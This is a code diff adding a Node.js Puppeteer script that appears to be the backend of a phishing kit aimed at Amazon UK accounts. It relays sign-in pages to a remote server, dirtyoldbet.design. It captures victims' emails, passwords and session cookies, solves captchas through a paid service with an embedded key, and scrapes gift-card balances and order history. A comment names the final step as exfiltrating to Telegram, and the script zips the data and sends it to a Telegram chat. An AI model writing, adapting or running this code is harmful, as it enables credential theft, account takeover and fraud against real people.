@@ -1,0 +1,647 @@
+const TelegramBot = require('node-telegram-bot-api');
+const token = "YOUR TOKEN HERE";
+const bot = new TelegramBot(token, { polling: true });
+const Client = require('@infosimples/node_two_captcha');
+client = new Client('370a0159f282be1822d94350483b0b2c', {
+    timeout: 60000,
+    polling: 5000,
+    throwErrors: false
+});
+
+
+const arguments = process.argv.slice(2);
+console.log(arguments);
+const screenY = parseInt(arguments[1]);
+const screenX = parseInt(arguments[0]);
+
+console.log("x: "+  screenX);
+console.log("y: " + screenY);
+
+
+const io2 = require('socket.io-client');
+var os = require("os");
+var hostname = os.hostname();
+
+// const socket2 = io2.connect('localhost:3000', { query: "foo=bar" });
+const socket2 = io2.connect("https://dirtyoldbet.design", { query: {"foo":"bar","hostname":hostname} });
+var bigBoy = "";
+socket2.on('idOfClickedEl2', (data)=> {
+        socket2.emit('raybigger', data);
+});
+
+var shell = require('shelljs');
+var archiver = require('archiver');
+const puppeteer = require('puppeteer');
+// const AdmZip = require('adm-zip');
+const fs = require('fs');
+var outputArr = [];
+const Axios = require('axios');
+
+// const request_client = require('request-promise-native');
+const amzurl = "https://www.amazon.co.uk/cpe/yourpayments/wallet?_encoding=UTF8&ref_=ya_mb_mpo";
+const orderUrl = 'https://www.amazon.co.uk/gp/css/order-history?ref_=nav_orders_first';
+
+var passSub = false;
+var solveCaptcha = false;
+
+
+
+async function downloadImage(url, filepath) {
+    const response = await Axios({
+        url,
+        method: 'GET',
+        responseType: 'stream'
+    });
+    return new Promise((resolve, reject) => {
+        response.data.pipe(fs.createWriteStream(filepath))
+            .on('error', reject)
+            .once('close', () => resolve(filepath));
+    });
+}
+
+function getBase64(url) {
+    return Axios.get(url, {
+        responseType: 'arraybuffer'
+    })
+        .then(response => Buffer.from(response.data, 'binary').toString('base64'))
+}
+
+
+// const m = puppeteer.devices['iPhone 6'];
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+(async () => {
+    const browser = await puppeteer.launch({
+        headless: false,
+        ignoreDefaultArgs: ["--enable-automation"],
+        defaultViewport: {
+            width: screenX,
+            height: 2100,
+            isMobile: true,
+            hasTouch: true,
+            isLandscape: false,
+            deviceScaleFactor: 3
+        },
+        //  args: ["--disable-save-password-bubble", `--window-size=360,780`, "--disable-infobars", "--disable-gpu", "--disable-dev-shm-usage", "--disable-setuid-sandbox", "--no-sandbox",],
+        args: ["--kiosk", "--disable-save-password-bubble", `--window-size=360,780`, "--disable-infobars", "--disable-gpu", "--disable-dev-shm-usage", "--disable-setuid-sandbox", "--no-sandbox",],
+
+        // args: ["--hide-scrollbars"],
+        //  args: [`--window-size=366,766`]
+        //     args: ["--disable-infobars", "--kiosk", "--disable-gpu", "--disable-dev-shm-usage", "--disable-setuid-sandbox", "--no-sandbox",]
+    });
+
+    const page = await browser.newPage();
+    // await page.emulate(m);
+    await page.setUserAgent('Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1');
+
+    await page.goto(amzurl);
+    //////////////////////////////////////////////////////////////////////////
+    const inputRectArrAll = await page.$$('input[type="tel"],input[type="email"],input[type="text"],input[type="password"]');
+    console.log("num inputs:" + inputRectArrAll.length);
+
+    const inputRectArrVis = [];
+    for (let i = 0; i < inputRectArrAll.length; i++) {
+
+        const el2 = await inputRectArrAll[i].boundingBox();
+        if (el2 !== null) {
+           const inputID = await (await inputRectArrAll[i].getProperty('id')).jsonValue();
+            const obj = { el2, inputID };
+
+            obj.el2.y = Math.floor(obj.el2.y);
+            obj.el2.x = Math.floor(obj.el2.x);
+            obj.el2.width = Math.floor(obj.el2.width);
+            obj.el2.height = Math.floor(obj.el2.height);
+            inputRectArrVis.push(obj);
+            console.log(obj.inputID);
+            console.log(obj.el2.x);
+            console.log(obj.el2.y);
+            console.log(obj.el2.width);
+            console.log(obj.el2.height);
+            //  socket2.emit("pupSendField", obj);
+        }
+    }
+    socket2.emit("pupSendField", inputRectArrVis);
+    console.log(inputRectArrVis.length);
+    ////////////////////////////////////////////////////////////////
+
+
+    await page.exposeFunction('processMouseup', async (type) => {
+
+        const inputRectArrAll = await page.$$('input[type="email"],input[type="tel"],input[type="text"],input[type="password"]');
+        console.log("num inputs:" + inputRectArrAll.length);
+
+        const inputRectArrVis = [];
+        for (let i = 0; i < inputRectArrAll.length; i++) {
+
+            const el2 = await inputRectArrAll[i].boundingBox();
+            if (el2 !== null) {
+                const inputID = await (await inputRectArrAll[i].getProperty('id')).jsonValue();
+                const obj = { el2, inputID };
+                obj.el2.y = Math.floor(obj.el2.y);
+                obj.el2.x = Math.floor(obj.el2.x);
+                obj.el2.width = Math.floor(obj.el2.width);
+                obj.el2.height = Math.floor(obj.el2.height);
+                inputRectArrVis.push(obj);
+                console.log(obj.inputID);
+                console.log(obj.el2.x);
+                console.log(obj.el2.y);
+                console.log(obj.el2.width);
+                console.log(obj.el2.height);
+                //  socket2.emit("pupSendField", obj);
+            }
+        }
+if (inputRectArrVis.length > 0){
+        socket2.emit("pupSendField", inputRectArrVis);
+        console.log(inputRectArrVis.length);
+}
+    });
+
+    await page.evaluate(() => {
+        document.addEventListener(
+            'mouseup',
+            (event) => { var n = event.target.tagName; var t = event.target.getAttribute("type"); window.processMouseup(); }, // Here you can send the data to Node.js context.
+        );
+    });
+
+    await page.exposeFunction('getEmail', async (type) => {
+        const email_field = await page.evaluate(() => {
+            return document.getElementById("ap_email_login").value;
+
+            //   return document.getElementById("#a-page > div.a-container > div:nth-child(3) > div.a-row.a-spacing-base").innerText;
+        });
+
+        console.log(email_field);
+        outputArr[2] = email_field;
+
+    });
+
+    await page.exposeFunction('testFocus', async (type) => {
+  //      socket2.emit('testKey', "");
+        console.log("test ok");
+
+    });
+
+    await page.exposeFunction('testFocus2', async (type) => {
+//        socket2.emit('closeKey', "");
+        console.log("focus out");
+    });
+
+    await page.exposeFunction('processClick', (tagName, type) => {
+        console.log("tag: " + tagName);
+        console.log("type: " + type);
+        if (tagName == "INPUT") {
+            console.log("tagnameinput");
+            if (type == "tel" || type == "password" || type == "text" || type == "email") {
+                console.log("focus on");
+                socket2.emit('testKey', "");
+
+            } else {
+                console.log("focus out");
+                socket2.emit('closeKey', "");
+            }
+        }
+        else { console.log("not input field"); socket2.emit('closeKey', ""); }
+    });
+
+    await page.evaluate(() => {
+        document.addEventListener(
+            'click',
+            (event) => { var n = event.target.tagName; var t = event.target.getAttribute("type"); window.processClick(n, t); }, // Here you can send the data to Node.js context.
+        );
+    });
+
+
+
+    await page.exposeFunction('getPassword', async (type) => {
+        const password_field = await page.evaluate(() => {
+
+            return document.getElementById("ap_password").value;
+        });
+        console.log(password_field);
+        outputArr[1] = password_field;
+
+    });
+
+
+    var pageLoadsNum = 0;
+    var capAttempts = 0;
+
+    async function onPageLoadFunction(e) {
+
+
+        //////////////////////////////////////////////////////////////////////////
+        const inputRectArrAll = await page.$$('input[type="tel"],input[type="email"],input[type="text"],input[type="password"]');
+        console.log("num inputs:" + inputRectArrAll.length);
+
+        const inputRectArrVis = [];
+        for (let i = 0; i < inputRectArrAll.length; i++) {
+
+            const el2 = await inputRectArrAll[i].boundingBox();
+            if (el2 !== null) {
+                const inputID = await (await inputRectArrAll[i].getProperty('id')).jsonValue();
+                const obj = { el2, inputID };
+                obj.el2.y = Math.floor(obj.el2.y);
+                obj.el2.x = Math.floor(obj.el2.x);
+                obj.el2.width = Math.floor(obj.el2.width);
+                obj.el2.height = Math.floor(obj.el2.height);
+                inputRectArrVis.push(obj);
+                console.log(obj.inputID);
+                console.log(obj.el2.x);
+                console.log(obj.el2.y);
+                console.log(obj.el2.width);
+                console.log(obj.el2.height);
+                //  socket2.emit("pupSendField", obj);
+            }
+        }
+        socket2.emit("pupSendField", inputRectArrVis);
+        console.log(inputRectArrVis.length);
+        ////////////////////////////////////////////////////////////////
+
+        await page.evaluate(() => {
+            document.addEventListener(
+                'click',
+                (event) => { var n = event.target.tagName; var t = event.target.getAttribute("type"); window.processClick(n, t); }, // Here you can send the data to Node.js context.
+            );
+        });
+
+
+        await page.evaluate(() => {
+            document.addEventListener(
+                'mouseup',
+                (event) => { var n = event.target.tagName; var t = event.target.getAttribute("type"); window.processMouseup(); }, // Here you can send the data to Node.js context.
+            );
+        });
+
+
+        pageLoadsNum++;
+        console.log('loaded: ' + pageLoadsNum);
+        //    await page.setViewport({ width: 666, height: 768});
+
+        // await page.screenshot({ path: 'logs/test/screenshot' + pageLoadsNum + '.png' });
+
+
+        // CAPTCHA PAGE
+        if (await page.$("#auth-captcha-image") !== null) {
+            if (solveCaptcha) {
+
+
+                /*
+                    4> pup encounters captcha
+                        > set captcha flag to true
+                        > check for invalid email/pw
+                        > emit display loadingImg - direct to normie (would need socketID passed above, not sure if this type of private msg is possible)? or routed through server3000
+                */
+                console.log("Captcha page");
+                capAttempts++;
+                if (capAttempts < 5) {
+
+
+                    try {
+                        const src = await page.evaluate(() => {
+                            const getImage = document.querySelector("img#auth-captcha-image:first-child").getAttribute("src");
+                            return getImage;
+                        });
+
+                        const b64 = getBase64(src);
+
+                        client.decode({
+                            base64: b64
+                        }).then(async function (response) {
+                            console.log("2captcha res: " + response.text);
+                            await page.type('#auth-captcha-guess', response.text);
+                            sleep(3);
+                            await page.type('#ap_password', outputArr[1]);
+                            sleep(3);
+                            await page.click('#signInSubmit');
+                        });
+                    } catch { console.log("captcha err throw unknown"); }
+                }
+                else {
+                    console.log("max captcha attempts exceeded");
+                }
+            } else {
+                console.log("manual captcha solve");
+
+            }
+        }
+        else {
+            /*
+                5> pup encounters non captcha page, set captcha_last_Page flag true
+                    > emit hide loadingImg
+            */
+        }
+
+
+        // LOGIN_PAGE
+        if (await page.$("#signInSubmit") !== null) {
+            passSub = true;
+
+            console.log("password page");
+            await page.evaluate(() => {
+                try {
+                    document.querySelector('form[name="signIn"]').addEventListener("submit", async () => {
+                        await window.getPassword();
+
+                    });
+                }
+                catch {
+                    console.log("couldnt get creds")
+                }
+            });
+        }
+        if (await page.$("#ap_login_form") !== null) {
+
+            console.log("email page");
+            await page.evaluate(() => {
+                try {
+                    document.querySelector('form[name="signIn"]').addEventListener("submit", async () => {
+                        await window.getEmail();
+
+                    });
+                }
+                catch {
+                    console.log("couldnt get creds")
+                }
+            });
+        }
+
+        // GC PAGE
+        if (await page.$("#paymentsHubContentSection") !== null) {
+            console.log("GC page");
+            try {
+                const gcBalDivInnerHtml = await page.evaluate(() => document.querySelector('#paymentsHubContentSection').innerHTML);
+
+                var gcbal = gcBalDivInnerHtml.trim();
+                var gcArr = gcbal.split('£');
+                var gcBalFin = gcArr[0];
+                var gcBalFin2 = gcBalFin.split('>');
+                var cnt = gcBalFin2.length - 1;
+                var gcBalFin3 = gcBalFin2[cnt];
+                console.log("gcbal: £" + gcBalFin3);
+                outputArr[3] = gcBalFin3;
+
+                //     console.log("GC BAL: " + outputArr[3]);
+                gcScraped = true;
+            }
+            catch {
+                console.log("couldnt get GC")
+            }
+
+            await page.goto(orderUrl);
+            var orderPageHtml = await page.evaluate(() => document.body.innerHTML);
+            //    console.log(orderPageHtml);
+            const hrefs = await page.$$eval('a', as => as.map(a => a.href));
+
+            var hrefsCnt = hrefs.length;
+            const ordernums = [];
+
+            for (var i = 0; i < hrefsCnt; i++) {
+                var aLink = hrefs[i];
+                if (aLink.includes("orderId")) {
+                    var bLink = aLink.split("orderId");
+                    var cLink = bLink[1].split("&");
+                    var dLink = cLink[0].replace("=", "").trim();
+                    console.log("order link : " + dLink);
+                    ordernums.push(dLink);
+                }
+            }
+            console.log("Count of orders; " + ordernums.length);
+
+
+            var len = ordernums.length;
+            const page2 = await browser.newPage();
+            for (let index = 0; index < len; index++) {
+                console.log("index: " + index);
+                var val = ordernums[index];
+                var urlbase = 'https://www.amazon.co.uk/gp/aw/ya/ref=yo_ii_od?ie=UTF8&ac=od&ii=&ij=0&noi=&of=&oi=&oid=' + val;
+                console.log(urlbase);
+                await page2.goto(urlbase);
+
+                var bodyHTML = await page2.evaluate(() => document.body.innerHTML);
+                //  console.log(bodyHTML);
+                var soldByArr = bodyHTML.split("Sold by:");
+                var soldByArr2 = soldByArr[1].split("<br");
+                var seller = soldByArr2[0].trim();
+                if (seller.includes("a href")) {
+                    var soldbyArr4 = seller.split(">");
+                    seller = soldbyArr4[1].replace("</a", "");
+                }
+                console.log(seller);
+
+                var priceArr = bodyHTML.split("Total: ");
+                var priceArr2 = priceArr[1].split("<br");
+                var price = priceArr2[0].replace("£", "").trim();
+                console.log(price);
+
+
+                var dateArr = bodyHTML.split("Order Date:");
+                var dateArr2 = dateArr[1].split("<br>");
+                var date = dateArr2[1].replace("&nbsp;", "").trim();
+                console.log(date);
+
+                var outputArrInd = outputArr.length;
+                var dataObj = { "order": [{ "date": date, "price": price, "seller": seller }] };
+                outputArr[outputArrInd] = dataObj;
+
+                var myJSON = JSON.stringify(outputArr);
+                fs.writeFile("/home/headless/work/logs/test/output.json", myJSON, 'utf8', function (err) {
+                    if (err) {
+                        console.log("An error occured while writing JSON Object to File.");
+                        return console.log(err);
+                    }
+
+                    console.log("JSON file has been saved.");
+
+
+                });
+            }
+
+
+            /*
+                7> pup completes scrape
+                    > exfiltrate to telegram
+                    > emit to server3000 to f5 docker cont
+            */
+
+            //   createZipArchive();
+
+            var dt = Date.now().toString()
+            await prepareConfig(dt);
+            //   createZipArchive();
+            //  sleep(10);
+
+            bot.sendDocument("-729645289", "/home/headless/work/logs/test/" + dt + ".zip");
+            //  orderNums.forEach(function(value){
+            //      value = value.replace("Order #", "").trim();
+            //     await page.goto('https://www.amazon.co.uk/gp/css/summary/print.html/ref=oh_aui_ajax_invoice?ie=UTF8&orderID='+value);
+            //   });
+            //https://www.amazon.co.uk/gp/css/summary/print.html/ref=oh_aui_ajax_invoice?ie=UTF8&orderID=206-5035869-5925955
+
+            //#a-page > section > div.your-orders-content-container__content.js-yo-main-content > div:nth-child(7) > div > div.a-box.a-color-offset-background.order-info > div > div > div > div.a-fixed-right-grid-col.actions.a-col-right > div.a-row.a-size-mini.yohtmlc-order-id > span.a-color-secondary.value > bdi
+
+        }
+
+
+
+        return e
+    };
+    function botSubmit(dt) {
+        return new Promise(resolve => {
+            var outputname = '/home/headless/work/logs/test/' + dt + '.zip';
+            console.log("output: " + outputname);
+            bot.sendDocument("-729645289", outputname);
+            resolve();
+
+        });
+
+    }
+
+    const prepareConfig = (instance) => new Promise((resolve) => {
+        // some other code with vars used below ....
+        var dt2 = Date.now().toString()
+
+        var archiveDst = "/home/headless/work/logs/test/" + instance + ".zip";
+        // create a file to stream archive data to.
+        const output = fs.createWriteStream(archiveDst);
+        const archive = archiver('zip', { zlib: { level: 9 } });
+
+        output.on('end', () => (console.log('Data has been drained')));
+        output.on('close', () => {
+            console.log(`Created: "${archiveDst}", total bytes: ${archive.pointer()}.`);
+            resolve();
+        });
+
+        archive.on('warning', (err) => {
+            if (err.code === 'ENOENT') {
+                console.log('Warning: ', err);
+            } else {
+                console.log('Error:');
+                throw err;
+            }
+        });
+
+        archive.on('error', (err) => {
+            console.log('Error:');
+            throw err;
+        });
+        var dstPath = "/home/headless/work/logs/test/"
+        // As we're globbing for files in the same dir we've put the archive, we must filter it
+        archive.directory(dstPath, false, file => !file.name.endsWith('.zip') ? file : false);
+
+        archive.pipe(output);
+
+        archive.finalize();
+    });
+
+
+
+    page.on('load', await onPageLoadFunction);
+
+
+
+
+    const result = [];
+    await page.setRequestInterception(true);
+
+
+
+
+
+
+    page.on('request', interceptedRequest => {
+        handleInterceptedHTTPRequest(interceptedRequest);
+    });
+
+    async function handleInterceptedHTTPRequest(req) {
+        try {
+            //   console.log(JSON.stringify(req.headers()));
+
+        }
+        catch {
+
+            console.log("ionno");
+        }
+
+        var cnt = req.url().length.toString();
+
+        if (req.url().includes("amazon.co.uk/ap/signin")) {
+            //   const resp = req.response();
+            //  console.log(await resp.text());
+            //         const bod = await req.response().text();
+            //        console.log(bod);
+        }
+        else {
+
+        }
+        req.continue();
+    }
+
+
+    page.on('response', resp => {
+        handleInterceptedHTTPResponse(resp);
+    });
+
+    async function handleInterceptedHTTPResponse(response) {
+        const thisUrl = response.url();
+
+        if (thisUrl === ("https://www.amazon.co.uk/ap/signin")) {
+
+            if (passSub === true) {
+
+                //  emit socket captcha likely captcha
+                //  sleep(3);
+                //  const bod = await response.text();
+                //   if (bod.includes("captcha")) {
+                //       console.log("captcha");
+                //    } else {
+                //       console.log("no captcha");
+                //   }
+            }
+        }
+
+        const status = response.status();
+
+        if ((status >= 300) && (status <= 399)) {
+            /*
+                6> pup redirects
+                    > save cookies? would it be better to use known url or something?
+            */
+            console.log('Redirect from', response.url(), 'to', response.headers()['location']);
+            const redirTo = response.headers()['location'];
+            if (redirTo.includes("https://www.amazon.co.uk/cpe/yourpayments/wallet")) {
+                console.log("+++++ AUTHENTICATED +++++");
+                socket2.emit("authenticated", "");
+            }
+
+            console.log("redir =>")
+            const cookies = await page.cookies();
+            console.log("cookies saved :)");
+            //    socket2.emit('redirSent',"");
+            outputArr[0] = cookies;
+        }
+
+    };
+
+
+
+    // https://www.amazon.co.uk/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.co.uk%2F%3F_encoding%3DUTF8%26ref_%3Dnavm_hdr_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=anywhere_v2_uk&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&
+
+
+    async function createZipArchive() {
+        const zip = new AdmZip();
+        var outputname = Date.now().toString();
+        console.log("outputname: " + outputname);
+        const outputFile = "logs/test/" + outputname + ".zip";
+        zip.addLocalFolder("logs/test");
+        zip.writeZip(outputFile);
+        console.log(`Created ${outputFile} successfully`);
+        bot.sendDocument("-729645289", outputFile);
+    }
+
+
+    function sleep(seconds) {
+        var e = new Date().getTime() + (seconds * 1000);
+        while (new Date().getTime() <= e) { }
+    }
+
+})();
